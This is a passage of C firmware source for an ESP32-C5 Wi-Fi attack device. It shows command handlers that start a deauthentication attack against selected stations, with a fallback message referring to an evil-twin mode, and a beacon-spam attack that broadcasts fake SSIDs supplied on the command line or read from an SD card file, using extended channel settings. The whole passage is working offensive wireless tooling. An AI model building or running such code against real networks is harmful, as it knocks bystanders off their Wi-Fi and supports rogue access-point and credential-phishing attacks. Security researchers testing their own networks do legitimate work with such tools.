Smethan/projectZero/ESP32C5/main/main.c
        MY_LOG_INFO(TAG,"Deauth attack started. Use 'stop' to stop.");
        
        // Show selected stations info for targeted deauth
        if (selected_stations_count > 0 && applicationState == DEAUTH) {
            MY_LOG_INFO(TAG, "Targeted mode: %d station(s)", selected_stations_count);
            for (int s = 0; s < selected_stations_count; s++) {
                MY_LOG_INFO(TAG, "  -> %02X:%02X:%02X:%02X:%02X:%02X",
                           selected_stations[s].mac[0], selected_stations[s].mac[1],
                           selected_stations[s].mac[2], selected_stations[s].mac[3],
                           selected_stations[s].mac[4], selected_stations[s].mac[5]);
            }
        }
        
        // Start deauth attack in background task
        deauth_attack_active = true;
        BaseType_t result = xTaskCreate(
            deauth_attack_task,
            "deauth_task",
            4096,  // Stack size
            NULL,
            5,     // Priority
            &deauth_attack_task_handle
        );
        
        if (result != pdPASS) {
            MY_LOG_INFO(TAG, "Failed to create deauth attack task!");
            deauth_attack_active = false;
            applicationState = IDLE;
            return 1;
        }
        
    } else {
        MY_LOG_INFO(TAG,"Evil twin: no selected APs (use select_networks).");
    }
    return 0;
}

/**
 * CLI command: start_beacon_spam "SSID1" "SSID2" ...
 * Starts beacon spam attack with multiple fake SSIDs
 */
static int start_beacon_spam_internal(void) {
    MY_LOG_INFO(TAG, "Starting beacon spam with %d SSIDs:", beacon_ssid_count);
    for (int i = 0; i < beacon_ssid_count; i++) {
        MY_LOG_INFO(TAG, "  %d: %s", i + 1, beacon_ssids[i]);
    }

    if (!ensure_wifi_mode()) {
        MY_LOG_INFO(TAG, "WiFi initialization failed");
        return 1;
    }

    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(100));

    esp_err_t err = esp_wifi_set_mode(WIFI_MODE_APSTA);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set APSTA mode: %s", esp_err_to_name(err));
        return 1;
    }

    wifi_config_t ap_config = {
        .ap = {
            .ssid = "",
            .ssid_len = 0,
            .ssid_hidden = 1,
            .password = "",
            .max_connection = 0,
            .authmode = WIFI_AUTH_OPEN
        },
    };
    esp_err_t ap_err = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    if (ap_err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set hidden AP config: %s", esp_err_to_name(ap_err));
    }

    err = esp_wifi_start();
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to start WiFi: %s", esp_err_to_name(err));
        return 1;
    }

    wifi_apply_extended_country();

    vTaskDelay(pdMS_TO_TICKS(100));

    err = esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set channel 1: %s", esp_err_to_name(err));
    }

    {
        uint8_t first_channel = 1;
        uint8_t last_channel = 11;
        wifi_get_24ghz_channel_bounds(&first_channel, &last_channel);
        MY_LOG_INFO(TAG, "WiFi configured for beacon spam on channels %u-%u",
                   first_channel, last_channel);
    }

    beacon_spam_active = true;
    operation_stop_requested = false;

    BaseType_t result = xTaskCreate(
        beacon_spam_task,
        "beacon_spam",
        4096,
        NULL,
        5,
        &beacon_spam_task_handle
    );

    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create beacon spam task");
        beacon_spam_active = false;
        beacon_spam_task_handle = NULL;
        return 1;
    }

    MY_LOG_INFO(TAG, "Beacon spam started. Use 'stop' to end.");
    return 0;
}

static int cmd_start_beacon_spam(int argc, char **argv) {
    {
        char oled_l3[24];
        snprintf(oled_l3, sizeof(oled_l3), "  %d fake SSIDs", argc - 1 > 0 ? argc - 1 : 0);
        oled_display_update_full("> Beacon Spam",
            argc >= 2 ? argv[1] : "  No SSIDs",
            oled_l3, "  Broadcast...");
    }
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: start_beacon_spam \"SSID1\" \"SSID2\" ...");
        return 1;
    }

    if (beacon_spam_active || beacon_spam_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Beacon spam already running. Use 'stop' first.");
        return 1;
    }

    beacon_ssid_count = 0;
    for (int i = 1; i < argc && beacon_ssid_count < MAX_BEACON_SSIDS; i++) {
        int len = strlen(argv[i]);
        if (len > 0 && len <= 32) {
            strncpy(beacon_ssids[beacon_ssid_count], argv[i], 32);
            beacon_ssids[beacon_ssid_count][32] = '\0';
            beacon_ssid_count++;
        } else {
            MY_LOG_INFO(TAG, "Warning: SSID %d invalid length (%d), skipping", i, len);
        }
    }

    if (beacon_ssid_count == 0) {
        MY_LOG_INFO(TAG, "No valid SSIDs provided");
        return 1;
    }

    return start_beacon_spam_internal();
}

static int cmd_start_beacon_spam_ssids(int argc, char **argv) {
    (void)argc; (void)argv;

    if (beacon_spam_active || beacon_spam_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Beacon spam already running. Use 'stop' first.");
        return 1;
    }

    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        return 1;
    }

    FILE *f = fopen(SSIDS_FILE_PATH, "r");
    if (f == NULL) {
        MY_LOG_INFO(TAG, "ssids.txt not found on SD card.");
        return 1;
    }

    beacon_ssid_count = 0;
    char line[96];
    while (beacon_ssid_count < MAX_BEACON_SSIDS && fgets(line, sizeof(line), f)) {
        char *s = line;
        while (*s && isspace((unsigned char)*s)) s++;
        char *e = s + strlen(s);
        while (e > s && (e[-1] == '\n' || e[-1] == '\r')) *--e = '\0';
        while (e > s && isspace((unsigned char)e[-1])) *--e = '\0';
        if (*s == '\0') continue;
        int len = strlen(s);
        if (len > 32) len = 32;
        strncpy(beacon_ssids[beacon_ssid_count], s, 32);
        beacon_ssids[beacon_ssid_count][32] = '\0';
        beacon_ssid_count++;
    }
    fclose(f);

    if (beacon_ssid_count == 0) {
        MY_LOG_INFO(TAG, "ssids.txt is empty - no SSIDs to broadcast");
        return 1;
    }

    {
        char oled_l3[24];
        snprintf(oled_l3, sizeof(oled_l3), "  %d SSIDs", beacon_ssid_count);
        oled_display_update_full("> Beacon Spam", "  from ssids.txt", oled_l3, "  Broadcast...");
    }

    return start_beacon_spam_internal();
}

